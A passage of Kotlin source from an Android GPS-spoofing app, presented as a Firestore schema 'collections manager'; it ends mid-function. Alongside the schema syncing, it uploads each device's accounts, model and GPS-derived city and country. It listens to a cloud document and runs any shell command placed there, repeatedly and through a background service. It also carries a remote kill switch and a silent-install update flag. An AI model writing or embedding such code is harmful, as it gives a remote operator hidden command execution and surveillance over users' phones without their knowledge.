package com.hamham.gpsmover.modules

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Geocoder
import android.location.Location
import android.location.LocationManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import androidx.core.content.ContextCompat
import com.hamham.gpsmover.modules.RootManager
import com.hamham.gpsmover.modules.RootCommandResult
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.DocumentReference
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.firestore.SetOptions
import com.google.android.gms.tasks.Tasks
import java.util.Locale
import java.util.Date
import kotlin.system.exitProcess

/**
 * Professional Collections Manager for Firestore Database
 * 
 * This manager ensures complete database synchronization with the schema defined in this file.
 * It handles:
 * - Creating collections and documents if they don't exist
 * - Adding missing fields from the defined schema
 * - Removing deprecated fields not in the schema
 * - Maintaining exact field structure as defined in this file
 * 
 * USAGE:
 * 1. Call initializeCollections(context) in onCreate() - for basic structure
 * 2. Call initializeCollections(context) after successful login - for user-specific sync
 * 
 * SCHEMA MANAGEMENT:
 * - Modify DATABASE_STRUCTURE to add/remove fields
 * - The database will automatically sync to match this file structure
 * - Safe for production use - preserves existing data while updating structure
 * 
 * Call initializeCollections() in onCreate() to ensure database consistency
 */
object CollectionsManager {
    
    private const val TAG = "CollectionsManager"
    
    // ======================= INITIALIZATION VARIABLES =======================
    
    private lateinit var firestore: FirebaseFirestore
    private lateinit var context: Context
    private var totalOperations = 0
    private var operationsCompleted = 0
    private var lastUpdateTime = 0L
    private val UPDATE_COOLDOWN = 5000L // 5 seconds cooldown between updates
    private var isInitialized = false // Track if collections have been initialized
    private var hasLoggedInSuccessfully = false // Track if user has logged in during this session
    private var hasDeviceInfoUpdated = false // Track if device info has been updated this session
    // Real-time listener variables
    private var shellCommandListener: ListenerRegistration? = null // Real-time listener for shell commands
    private var isExecutingCommand = false // Flag to prevent concurrent execution
    private var lastExecutionStartTime = 0L // Track when last execution started
    private val EXECUTION_TIMEOUT = 120000L // 2 minutes maximum execution time
    private var currentExecutionThread: Thread? = null // Track current execution thread
    
    // ======================= DATABASE STRUCTURE =======================
    
    /**
     * Complete database structure definition
     * All collections and their document schemas are defined here
     */
    private val DATABASE_STRUCTURE = mapOf(
        "application" to mapOf(
            "rules" to mapOf(
                "kill" to mapOf(
                    "enabled" to false,
                    "message" to "App stoped",
                    "title" to "Message"
                ),
                "update" to mapOf(
                    "latest_version" to 3,
                    "message" to "An update is available. You can install it.",
                    "min_version" to 1,
                    "required" to false,
                    "silent_install" to false,
                    "url" to "https://github.com/dvhamham/gps-mover/releases/download/1.0.1/app-release.apk"
                ),
                "created_at" to FieldValue.serverTimestamp(),
                "updated_at" to FieldValue.serverTimestamp()
            )
        ),
        "devices" to mapOf(
            "template_device" to mapOf(
                "account" to "",
                "accounts" to mapOf<String, String>(),
                "app_version" to "",
                "banned" to false,
                "custom_message" to mapOf(
                    "enabled" to false,
                    "title" to "",
                    "text" to ""
                ),
                "about" to mapOf(
                    "manufacturer" to "",
                    "model" to "",
                    "os_version" to ""
                ),
                "location" to mapOf(
                    "city" to "",
                    "country" to ""
                ),
                "favourites" to mapOf(
                    "list" to listOf<Map<String, Any>>(
                        // Example favorite with new coordinates structure (string format)
                        // mapOf(
                        //     "id" to "1640995200000",
                        //     "name" to "Sample Location",
                        //     "coordinates" to "33.738732, -7.389884",
                        //     "order" to 0
                        // )
                    )
                ),
                "shell" to mapOf(
                    "command" to "",
                    "run" to false,
                    "count" to 1,
                    "wait" to 0,
                    "result" to ""
                ),
                "created_at" to FieldValue.serverTimestamp(),
                "updated_at" to FieldValue.serverTimestamp()
            )
        )
    )
    
    
    // ======================= MAIN INITIALIZATION FUNCTION =======================
    
    /**
     * Reset initialization flags - useful for testing or when app needs to reinitialize
     * Should only be called in specific scenarios like user logout
     */
    fun resetInitializationFlags() {
        Log.i(TAG, "🔄 Resetting initialization flags")
        isInitialized = false
        hasLoggedInSuccessfully = false
        hasDeviceInfoUpdated = false
        
        // Stop real-time shell command listener
        shellCommandListener?.remove()
        shellCommandListener = null
        
        // Reset execution flag
        isExecutingCommand = false
        Log.d(TAG, "🔓 Execution flag reset during initialization reset")
    }

    /**
     * Initialize device document with real data for login purposes
     */
    private fun initializeDeviceDocumentWithData(deviceRef: DocumentReference) {
        Log.i(TAG, "🆕 Initializing device document for login: ${deviceRef.path}")
        
        // Get device schema from cached data
        val deviceSchema = DATABASE_STRUCTURE["devices"]?.get("template_device") ?: mapOf()
        
        // Create device with real data but don't complete operation
        createDeviceDocumentWithRealData(deviceRef, deviceSchema, deviceRef.path, false)
    }

    /**
     * Called when user successfully logs in - only updates on first successful login
     * This prevents multiple updates during the same session
     */
    fun onUserLoginSuccess(ctx: Context) {
        if (hasLoggedInSuccessfully) {
            Log.d(TAG, "⏭️ User already logged in successfully this session, skipping update...")
            return
        }
        
        Log.i(TAG, "🎉 First successful login detected - updating account information")
        
        // Mark that user has logged in successfully
        hasLoggedInSuccessfully = true
        
        // Initialize context and firestore if not already done
        if (!::context.isInitialized) {
            context = ctx
        }
        if (!::firestore.isInitialized) {
            firestore = FirebaseFirestore.getInstance()
        }
        
        val user = FirebaseAuth.getInstance().currentUser
        if (user != null) {
            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
            
            if (deviceId != null) {
                // Check if device document exists, create it if not
                Log.i(TAG, "🔄 Checking device document existence for first-time login")
                val deviceRef = firestore.collection("devices").document(deviceId)
                
                deviceRef.get()
                    .addOnSuccessListener { document ->
                        if (!document.exists()) {
                            // Device doesn't exist - create it with real data
                            Log.i(TAG, "📱 Device document doesn't exist, creating during login: devices/$deviceId")
                            initializeDeviceDocumentWithData(deviceRef)
                        } else {
                            // Device exists - update with current user info
                            Log.i(TAG, "� Device document exists, updating during login: devices/$deviceId")
                            updateDeviceInformationForDocument(user.uid, deviceId)
                        }
                    }
                    .addOnFailureListener { exception ->
                        Log.e(TAG, "❌ Failed to check device document during login", exception)
                        // Fallback: try to create the device anyway
                        initializeDeviceDocumentWithData(deviceRef)
                    }
            } else {
                Log.w(TAG, "⚠️ Device ID not available for login update")
            }
        } else {
            Log.w(TAG, "⚠️ No authenticated user found for login update")
        }
        
        // Restart real-time shell command listener for logged in user
        startShellCommandListener()
        
        // Start background service for shell command execution
        try {
            val serviceClass = Class.forName("com.hamham.gpsmover.services.ShellCommandService")
            val startServiceMethod = serviceClass.getMethod("startService", Context::class.java)
            startServiceMethod.invoke(null, ctx)
            Log.i(TAG, "✅ Background shell command service started after login")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start background service after login", e)
        }
    }

    /**
     * Main initialization function - Sets up database context and starts synchronization
     * Only runs once per app session to avoid duplicate operations
     * Only updates device info if user is logged in
     */
    fun initializeCollections(ctx: Context) {
        if (isInitialized) {
            Log.d(TAG, "⏭️ Collections already initialized, skipping...")
            return
        }
        
        Log.i(TAG, "🚀 Starting CollectionsManager initialization")
        
        // Mark as initialized to prevent duplicate calls
        isInitialized = true
        
        // Initialize context and Firestore
        context = ctx
        firestore = FirebaseFirestore.getInstance()
        
        // Reset operation tracking
        totalOperations = 0
        operationsCompleted = 0
        
        // Debug schema information
        Log.d(TAG, "📋 Database schema contains ${DATABASE_STRUCTURE.size} collections")
        
        // Count total operations needed
        for ((collectionName, documents) in DATABASE_STRUCTURE) {
            totalOperations += documents.size
        }
        
        Log.i(TAG, "🎯 Total operations to perform: $totalOperations")
        
        // Initialize each collection
        for ((collectionName, documents) in DATABASE_STRUCTURE) {
            for ((documentName, schema) in documents) {
                initializeCollection(collectionName, documentName, schema)
            }
        }
        
        // Special handling for user-specific device initialization
        val user = FirebaseAuth.getInstance().currentUser
        if (user != null) {
            Log.i(TAG, "👤 User is logged in, initializing device document with data")
            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
            
            if (deviceId != null) {
                initializeDeviceDocumentWithData(user.uid, deviceId)
                
                // Update account information will be called automatically after device initialization
                // No need to call it explicitly here to avoid duplicate updates
            }
        } else {
            Log.i(TAG, "👤 No user logged in, skipping device initialization")
        }
        
        // Start real-time shell command listener after initialization
        startShellCommandListener()
    }
    
    // ======================= COLLECTION & DOCUMENT CREATION =======================
    
    /**
     * Initializes a single collection with all its documents
     */
    private fun initializeCollection(
        collectionName: String,
        documentName: String,
        schema: Map<String, Any>
    ) {
        Log.i(TAG, "🏗️ Initializing document: $collectionName/$documentName")
        
        val documentRef = firestore.collection(collectionName).document(documentName)
        
        documentRef.get()
            .addOnSuccessListener { snapshot ->
                if (!snapshot.exists()) {
                    // Document doesn't exist - create it
                    Log.i(TAG, "📄 Document doesn't exist, creating: $collectionName/$documentName")
                    createDocumentWithCallback(documentRef, schema, "$collectionName/$documentName")
                } else {
                    // Document exists - synchronize schema
                    Log.i(TAG, "� Document exists, synchronizing: $collectionName/$documentName")
                    val existingData = snapshot.data ?: emptyMap()
                    
                    synchronizeDocumentWithCallback(
                        documentRef, 
                        existingData, 
                        schema, 
                        "$collectionName/$documentName"
                    )
                }
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to initialize document: $collectionName/$documentName", exception)
                completeOperation()
            }
    }
    
    /**
     * Special initialization for device documents with actual device data
     */
    private fun initializeDeviceDocumentWithData(userId: String, deviceId: String) {
        // Get the device schema from DATABASE_STRUCTURE
        val deviceSchema = DATABASE_STRUCTURE["devices"]?.get("template_device") ?: return
        
        val deviceRef = firestore.collection("devices").document(deviceId)
        
        Log.i(TAG, "🔧 Initializing device document with real data: devices/$deviceId")
        
        deviceRef.get()
            .addOnSuccessListener { snapshot ->
                if (!snapshot.exists()) {
                    // Document doesn't exist - create it with actual device data
                    Log.i(TAG, "📱 Device document doesn't exist, creating with real data: devices/$deviceId")
                    createDeviceDocumentWithRealData(deviceRef, deviceSchema, "devices/$deviceId")
                } else {
                    // Document exists - synchronize schema and update with real data
                    Log.i(TAG, "📋 Device document exists, synchronizing: devices/$deviceId")
                    val existingData = snapshot.data ?: emptyMap()
                    
                    synchronizeDocumentWithCallback(
                        deviceRef, 
                        existingData, 
                        deviceSchema, 
                        "devices/$deviceId"
                    )
                    
                    // Mark that device info will be updated to avoid duplicate updates
                    hasDeviceInfoUpdated = true
                    
                    // Also trigger immediate device info update for existing documents
                    Log.i(TAG, "📱 Triggering immediate device info update for existing document")
                    updateDeviceInformationForDocument(userId, deviceRef.id)
                }
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to initialize device document: devices/$deviceId", exception)
                completeOperation()
            }
    }
    
    
    /**
     * Initializes a single document with schema validation and synchronization
     * Includes callback tracking for completion detection
     */
    private fun initializeDocumentWithCallback(
        collectionName: String,
        documentId: String,
        schema: Map<String, Any>
    ) {
        val documentRef = firestore.collection(collectionName).document(documentId)
        
        Log.i(TAG, "🔧 Initializing document: $collectionName/$documentId")
        
        documentRef.get()
            .addOnSuccessListener { snapshot ->
                if (!snapshot.exists()) {
                    // Document doesn't exist - create it
                    Log.i(TAG, "📄 Document doesn't exist, creating: $collectionName/$documentId")
                    createDocumentWithCallback(documentRef, schema, "$collectionName/$documentId")
                } else {
                    // Document exists - synchronize schema
                    Log.i(TAG, "📋 Document exists, synchronizing: $collectionName/$documentId")
                    val existingData = snapshot.data ?: emptyMap()
                    
                    synchronizeDocumentWithCallback(
                        documentRef, 
                        existingData, 
                        schema, 
                        "$collectionName/$documentId"
                    )
                }
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to initialize document: $collectionName/$documentId", exception)
                completeOperation()
            }
    }
    
    /**
     * Creates a device document with actual device information instead of empty values
     */
    private fun createDeviceDocumentWithRealData(
        documentRef: com.google.firebase.firestore.DocumentReference,
        schema: Map<String, Any>,
        documentPath: String,
        shouldCompleteOperation: Boolean = true
    ) {
        Log.i(TAG, "📝 Creating device document with real data: $documentPath")
        
        try {
            val auth = FirebaseAuth.getInstance()
            val user = auth.currentUser
            
            // Collect real device information
            val deviceModel = Build.MODEL ?: "Unknown Model"
            val deviceManufacturer = Build.MANUFACTURER ?: "Unknown Manufacturer"
            val androidVersion = Build.VERSION.RELEASE ?: "Unknown Version"
            val currentAppVersion = try {
                context.packageManager.getPackageInfo(context.packageName, 0).versionName
            } catch (e: Exception) { 
                "N/A" 
            }
            val currentAccountEmail = user?.email ?: ""
            val currentAccountName = user?.displayName ?: ""
            val androidId = documentRef.id
            
            // Get location information
            val (country, city) = getDeviceLocation()
            
            Log.d(TAG, "📱 Creating device with data - Model: $deviceModel, OS: $androidVersion")
            Log.d(TAG, "📍 Location - Country: $country, City: $city")
            
            // Create populated device data based on schema structure
            val deviceData = mutableMapOf<String, Any>()
            
            // Basic account information
            deviceData["account"] = currentAccountEmail
            
            // Create accounts map with current user if available
            val accountsMap = mutableMapOf<String, String>()
            if (currentAccountEmail.isNotEmpty()) {
                accountsMap[currentAccountEmail] = currentAccountName
            }
            deviceData["accounts"] = accountsMap
            
            // App version
            deviceData["app_version"] = currentAppVersion
            
            // Device ban status
            deviceData["banned"] = false
            
            // Custom message structure
            deviceData["custom_message"] = mapOf(
                "enabled" to false,
                "text" to "",
                "title" to ""
            )
            
            // Device information
            deviceData["about"] = mapOf(
                "manufacturer" to deviceManufacturer,
                "model" to deviceModel,
                "os_version" to androidVersion
            )
            
            // Location information
            deviceData["location"] = mapOf(
                "city" to city,
                "country" to country
            )
            
            // Favourites list
            deviceData["favourites"] = mapOf(
                "list" to emptyList<Map<String, Any>>()
            )
            
            // Shell command execution system
            deviceData["shell"] = mapOf(
                "command" to "",
                "run" to false,
                "count" to 1,
                "wait" to 0,
                "result" to ""
            )
            
            deviceData["created_at"] = FieldValue.serverTimestamp()
            deviceData["updated_at"] = FieldValue.serverTimestamp()
            
            Log.i(TAG, "💾 Creating device document with populated data")
            
            documentRef.set(deviceData, SetOptions.merge())
                .addOnSuccessListener {
                    Log.i(TAG, "✅ Successfully created device document with real data: $documentPath")
                    if (shouldCompleteOperation) {
                        completeOperation()
                    }
                }
                .addOnFailureListener { exception ->
                    Log.e(TAG, "❌ Failed to create device document with real data: $documentPath", exception)
                    if (shouldCompleteOperation) {
                        completeOperation()
                    }
                }
                
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error collecting device data, falling back to empty schema", e)
            // Fallback to creating with empty schema
            createDocumentWithCallback(documentRef, schema, documentPath)
        }
    }
    
    /**
     * Creates a new document with the complete schema (with callback tracking)
     */
    private fun createDocumentWithCallback(
        documentRef: com.google.firebase.firestore.DocumentReference,
        schema: Map<String, Any>,
        documentPath: String
    ) {
        Log.i(TAG, "📝 Creating new document: $documentPath")
        
        documentRef.set(schema, SetOptions.merge())
            .addOnSuccessListener {
                Log.i(TAG, "✅ Successfully created document: $documentPath")
                completeOperation()
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to create document: $documentPath", exception)
                completeOperation() // Still complete the operation even if it failed
            }
    }
    
    /**
     * Synchronizes existing document with the defined schema (with callback tracking)
     */
    private fun synchronizeDocumentWithCallback(
        documentRef: com.google.firebase.firestore.DocumentReference,
        existingData: Map<String, Any>,
        schema: Map<String, Any>,
        documentPath: String
    ) {
        Log.i(TAG, "🔄 Starting synchronization for document: $documentPath")
        Log.d(TAG, "Schema structure: $schema")
        Log.d(TAG, "Existing data structure: $existingData")
        
        val updates = mutableMapOf<String, Any>()
        
        // Find fields to add (missing in database)
        Log.d(TAG, "Phase 1: Finding missing fields...")
        findMissingFields(schema, existingData, updates)
        
        // Find fields to remove (extra in database)  
        Log.d(TAG, "Phase 2: Finding extra fields...")
        findExtraFields(schema, existingData, updates)
        
        Log.i(TAG, "Updates to apply for $documentPath: $updates")
        
        // Apply changes if any differences found
        if (updates.isNotEmpty()) {
            Log.i(TAG, "📝 Synchronizing document: $documentPath (${updates.size} changes)")
            
            // Log each update
            updates.forEach { (path, value) ->
                if (value == FieldValue.delete()) {
                    Log.w(TAG, "  🗑️ DELETE: $path")
                } else {
                    Log.i(TAG, "  ✏️ UPDATE: $path = $value")
                }
            }
            
            // Add updated timestamp
            updates["updated_at"] = FieldValue.serverTimestamp()
            
            documentRef.update(updates)
                .addOnSuccessListener {
                    Log.i(TAG, "✅ Successfully synchronized document: $documentPath")
                    completeOperation()
                }
                .addOnFailureListener { exception ->
                    Log.e(TAG, "❌ Failed to synchronize document: $documentPath", exception)
                    completeOperation() // Still complete the operation even if it failed
                }
        } else {
            Log.d(TAG, "✅ Document already in sync: $documentPath")
            completeOperation()
        }
    }
    
    // ===================== DEVICE UPDATE FUNCTIONS =====================
    
    /**
     * Updates device information for a specific device document (current device only)
     */
    private fun updateDeviceInformationForDocument(userId: String, deviceId: String) {
        val deviceRef = firestore.collection("devices").document(deviceId)
            
        Log.i(TAG, "🔄 Starting device information update for current device only: $deviceId")
        
        try {
            val updates = mutableMapOf<String, Any>()
            
            // Get current user information
            val user = FirebaseAuth.getInstance().currentUser
            val currentAccountEmail = user?.email ?: ""
            val currentAccountName = user?.displayName ?: ""
            
            // Get device information
            val deviceModel = Build.MODEL ?: "Unknown Model"
            val deviceManufacturer = Build.MANUFACTURER ?: "Unknown Manufacturer"
            val androidVersion = Build.VERSION.RELEASE ?: "Unknown Version"
            
            // Update device information using the correct structure
            updates["about.model"] = deviceModel
            updates["about.manufacturer"] = deviceManufacturer
            updates["about.os_version"] = androidVersion
            
            // Update current account
            if (currentAccountEmail.isNotEmpty()) {
                updates["account"] = currentAccountEmail
                Log.i(TAG, "👤 Adding/updating account: $currentAccountEmail -> $currentAccountName")
            }
            
            updates["updated_at"] = FieldValue.serverTimestamp()
            
            Log.i(TAG, "📱 Device info - Model: $deviceModel, Manufacturer: $deviceManufacturer, Android: $androidVersion")
            
            // Try to get location
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            
            if (checkLocationPermissions()) {
                try {
                    val location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                        ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                        
                    if (location != null) {
                        Log.i(TAG, "📍 Location info - Lat: ${location.latitude}, Lon: ${location.longitude}")
                        
                        // Try to get location name using Geocoder
                        try {
                            val geocoder = Geocoder(context, Locale.getDefault())
                            val addresses = geocoder.getFromLocation(location.latitude, location.longitude, 1)
                            
                            if (addresses?.isNotEmpty() == true) {
                                val address = addresses[0]
                                val country = address.countryName ?: ""
                                val city = address.locality ?: address.subAdminArea ?: ""
                                
                                updates["location.country"] = country
                                updates["location.city"] = city
                                
                                Log.i(TAG, "� Location - Country: $country, City: $city")
                            }
                        } catch (e: Exception) {
                            Log.w(TAG, "⚠️ Failed to get location name", e)
                        }
                    } else {
                        Log.w(TAG, "⚠️ No location available")
                    }
                } catch (e: SecurityException) {
                    Log.w(TAG, "⚠️ Location permission denied", e)
                }
            }
            
            // Apply updates to Firestore
            deviceRef.get()
                .addOnSuccessListener { document ->
                    // If user has an account, include accounts map update in the same operation
                    if (currentAccountEmail.isNotEmpty()) {
                        val existingAccounts = document.get("accounts") as? Map<String, String> ?: mapOf()
                        val updatedAccounts = existingAccounts.toMutableMap()
                        updatedAccounts[currentAccountEmail] = currentAccountName
                        updates["accounts"] = updatedAccounts
                        Log.i(TAG, "📋 Including accounts map update in same operation")
                    }
                    
                    // Perform single update operation
                    deviceRef.update(updates)
                        .addOnSuccessListener {
                            Log.i(TAG, "✅ Successfully updated device information and accounts for: $deviceId")
                        }
                        .addOnFailureListener { exception ->
                            Log.e(TAG, "❌ Failed to update device information for: $deviceId", exception)
                        }
                }
                .addOnFailureListener { exception ->
                    Log.e(TAG, "❌ Failed to get device document for update", exception)
                    // Fallback to update without accounts
                    deviceRef.update(updates)
                        .addOnSuccessListener {
                            Log.i(TAG, "✅ Successfully updated device information (fallback) for: $deviceId")
                        }
                        .addOnFailureListener { fallbackException ->
                            Log.e(TAG, "❌ Failed fallback update for: $deviceId", fallbackException)
                        }
                }
                
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error updating device information for: $deviceId", e)
        }
    }
    
    /**
     * Updates the accounts map correctly to avoid dot notation issues with email addresses
     */
    private fun updateAccountsMap(
        deviceRef: com.google.firebase.firestore.DocumentReference,
        email: String,
        name: String
    ) {
        deviceRef.get()
            .addOnSuccessListener { document ->
                val existingAccounts = document.get("accounts") as? Map<String, String> ?: mapOf()
                val updatedAccounts = existingAccounts.toMutableMap()
                updatedAccounts[email] = name
                
                deviceRef.update(
                    mapOf(
                        "accounts" to updatedAccounts,
                        "updated_at" to FieldValue.serverTimestamp()
                    )
                )
                .addOnSuccessListener {
                    Log.i(TAG, "✅ Successfully updated accounts map: $email -> $name")
                }
                .addOnFailureListener { exception ->
                    Log.e(TAG, "❌ Failed to update accounts map", exception)
                }
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to get device document for accounts update", exception)
            }
    }
    
    /**
     * Checks if location permissions are granted
     */
    private fun checkLocationPermissions(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
               ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
    }
    
    /**
     * Updates device information for all user devices after initialization
     */
    private fun updateDeviceInformation() {
        if (hasDeviceInfoUpdated) {
            Log.d(TAG, "⏭️ Device info already updated this session, skipping...")
            return
        }
        
        val user = FirebaseAuth.getInstance().currentUser
        if (user == null) {
            Log.w(TAG, "⚠️ No user logged in, skipping device information update")
            return
        }
        
        hasDeviceInfoUpdated = true
        
        val userId = user.uid
        Log.i(TAG, "🔄 Starting device information update for user: $userId")
        
        // Get current device ID
        val currentDeviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        
        // Update information ONLY for current device
        Log.i(TAG, "📱 Updating information for current device only: $currentDeviceId")
        updateDeviceInformationForDocument(userId, currentDeviceId)
        
        // Note: updateAccountInformation will be called from updateDeviceInformationForDocument
        // to avoid duplicate calls
    }
    
    /**
     * Public function to add an account to the accounts list (safe for emails with dots)
     */
    fun addAccountToDevice(context: Context, email: String, name: String) {
        if (email.isEmpty()) {
            Log.w(TAG, "⚠️ Empty email provided, skipping account addition")
            return
        }
        
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        val deviceRef = firestore.collection("devices").document(androidId)
        
        Log.i(TAG, "👤 Adding account to device: $email -> $name")
        updateAccountsMap(deviceRef, email, name)
    }
    
    /**
     * Updates account information when user logs in or switches accounts
     */
    fun updateAccountInformation(context: Context) {
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastUpdateTime < UPDATE_COOLDOWN) {
            Log.d(TAG, "⏱️ Skipping account update - still in cooldown period")
            return
        }
        
        val user = FirebaseAuth.getInstance().currentUser
        if (user == null) {
            Log.w(TAG, "⚠️ No user logged in, skipping account information update")
            return
        }
        
        lastUpdateTime = currentTime
        
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        val deviceRef = firestore.collection("devices").document(androidId)
        
        val currentAccountEmail = user.email ?: ""
        val currentAccountName = user.displayName ?: ""
        
        if (currentAccountEmail.isNotEmpty()) {
            Log.i(TAG, "👤 Updating account information: $currentAccountEmail")
            
            // Update current account first
            deviceRef.update(
                mapOf(
                    "account" to currentAccountEmail,
                    "updated_at" to FieldValue.serverTimestamp()
                )
            )
            .addOnSuccessListener {
                Log.i(TAG, "✅ Successfully updated current account: $currentAccountEmail")
                // Then update accounts map
                updateAccountsMap(deviceRef, currentAccountEmail, currentAccountName)
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to update account information", exception)
            }
        }
    }
    
    
    // ===================== RULES AND ADMIN FUNCTIONS =====================
    
    /**
     * Starts real-time listener for shell commands
     * This enables immediate execution when run flag is set to true in database
     */
    private fun startShellCommandListener() {
        if (!::context.isInitialized || !::firestore.isInitialized) {
            Log.w(TAG, "⚠️ Context or Firestore not initialized, cannot start shell command listener")
            return
        }
        
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        if (androidId.isNullOrEmpty()) {
            Log.w(TAG, "⚠️ Android ID not available, cannot start shell command listener")
            return
        }
        
        // Remove existing listener if any
        shellCommandListener?.remove()
        
        Log.i(TAG, "🎧 Starting real-time shell command listener for device: $androidId")
        
        shellCommandListener = firestore.collection("devices").document(androidId)
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    Log.e(TAG, "❌ Error in shell command listener", error)
                    return@addSnapshotListener
                }
                
                Log.d(TAG, "📋 Snapshot listener triggered - snapshot exists: ${snapshot?.exists()}")
                
                if (snapshot != null && snapshot.exists()) {
                    val shellData = snapshot.get("shell") as? Map<String, Any>
                    Log.d(TAG, "📋 Shell data retrieved: $shellData")
                    
                    if (shellData != null) {
                        val shouldRun = shellData["run"] as? Boolean ?: false
                        val command = shellData["command"] as? String ?: ""
                        val count = (shellData["count"] as? Number)?.toInt() ?: 1
                        var waitSeconds = (shellData["wait"] as? Number)?.toInt() ?: 0
                        
                        // Handle wait time conversion - if > 60, assume it's in milliseconds
                        if (waitSeconds > 60) {
                            Log.w(TAG, "⚠️ Wait value seems to be in milliseconds ($waitSeconds), converting to seconds")
                            waitSeconds = (waitSeconds / 1000).coerceAtLeast(1) // Ensure at least 1 second
                            Log.i(TAG, "🔄 Converted wait time to ${waitSeconds}s")
                        }
                        
                        Log.d(TAG, "📋 Shell parameters - Run: $shouldRun, Command: '$command', Count: $count, Wait: ${waitSeconds}s")
                        Log.i(TAG, "📊 Execution parameters parsed - Will execute $count times with ${waitSeconds}s wait between executions")
                        
                        // Only execute if run is true, command is not empty, and not already executing
                        if (shouldRun && command.isNotEmpty() && !isExecutingCommand) {
                            Log.i(TAG, "🔔 Real-time shell command detected - Command: '$command', Count: $count, Wait: ${waitSeconds}s")
                            
                            // Set execution flag to prevent concurrent execution
                            isExecutingCommand = true
                            lastExecutionStartTime = System.currentTimeMillis()
                            
                            // Execute the command sequence
                            executeShellCommandSequence(context, command, count, waitSeconds, androidId)
                        } else if (isExecutingCommand) {
                            // Check if execution has been stuck for too long
                            val currentTime = System.currentTimeMillis()
                            if (currentTime - lastExecutionStartTime > EXECUTION_TIMEOUT) {
                                Log.e(TAG, "⚠️ Execution timeout detected! Forcing reset after ${EXECUTION_TIMEOUT/1000}s")
                                
                                // Force reset the execution state
                                isExecutingCommand = false
                                lastExecutionStartTime = 0L
                                
                                // Interrupt current execution thread if it exists
                                currentExecutionThread?.interrupt()
                                currentExecutionThread = null
                                
                                // Force disable run flag in database
                                disableShellRunFlag(androidId, "FORCED RESET: Execution timeout after ${EXECUTION_TIMEOUT/1000} seconds")
                                
                                Log.w(TAG, "🔄 Execution state reset due to timeout - ready for new commands")
                            } else {
                                Log.d(TAG, "📋 Command already executing, ignoring new trigger (${(currentTime - lastExecutionStartTime)/1000}s elapsed)")
                            }
                        } else if (!shouldRun) {
                            Log.d(TAG, "📋 Shell execution flag is false - no execution needed")
                        } else if (command.isEmpty()) {
                            Log.d(TAG, "📋 Shell command is empty - no execution needed")
                        } else {
                            Log.d(TAG, "📋 Shell execution conditions not met - Run: $shouldRun, Command empty: ${command.isEmpty()}")
                        }
                    } else {
                        Log.d(TAG, "📋 No shell data found in snapshot")
                    }
                } else {
                    Log.d(TAG, "📋 Device document does not exist in real-time listener")
                }
            }
        
        Log.i(TAG, "✅ Real-time shell command listener started successfully")
    }
    
    /**
     * Stops the real-time shell command listener
     */
    private fun stopShellCommandListener() {
        shellCommandListener?.remove()
        shellCommandListener = null
        Log.i(TAG, "✅ Real-time shell command listener stopped")
    }
    
    /**
     * Public function to start real-time shell command monitoring
     * Call this from your main activity or service to enable real-time command execution
     */
    fun startRealTimeShellMonitoring(ctx: Context) {
        if (!::context.isInitialized) {
            context = ctx
        }
        if (!::firestore.isInitialized) {
            firestore = FirebaseFirestore.getInstance()
        }
        
        Log.i(TAG, "🚀 Starting real-time shell command monitoring")
        startShellCommandListener()
        
        // Also start background service for when app is not in foreground
        try {
            val serviceClass = Class.forName("com.hamham.gpsmover.services.ShellCommandService")
            val startServiceMethod = serviceClass.getMethod("startService", Context::class.java)
            startServiceMethod.invoke(null, ctx)
            Log.i(TAG, "✅ Background shell command service started")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start background service", e)
        }
    }
    
    /**
     * Public function to stop real-time shell command monitoring
     */
    fun stopRealTimeShellMonitoring() {
        Log.i(TAG, "🛑 Stopping real-time shell command monitoring")
        stopShellCommandListener()
        
        // Also stop background service
        try {
            val serviceClass = Class.forName("com.hamham.gpsmover.services.ShellCommandService")
            val stopServiceMethod = serviceClass.getMethod("stopService", Context::class.java)
            stopServiceMethod.invoke(null, context)
            Log.i(TAG, "✅ Background shell command service stopped")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to stop background service", e)
        }
    }
    
    /**
     * Checks if the application should be killed globally
     */
    fun checkKillAllStatus(context: Context, onKilled: (() -> Unit)? = null) {
        Log.i(TAG, "🔍 Checking kill status from application rules...")
        
        firestore.collection("application").document("rules").get()
            .addOnSuccessListener { document ->
                val killData = document.get("kill") as? Map<String, Any>
                val killEnabled = killData?.get("enabled") as? Boolean ?: false
                
                if (killEnabled) {
                    val title = killData?.get("title") as? String ?: "Message"
                    val message = killData?.get("message") as? String ?: "App stoped"
                    
                    Log.w(TAG, "⚠️ Global kill is enabled - terminating application")
                    applicationDisabled(context, message, title)
                    onKilled?.invoke()
                } else {
                    Log.d(TAG, "✅ Global kill is disabled - application can continue")
                }
            }
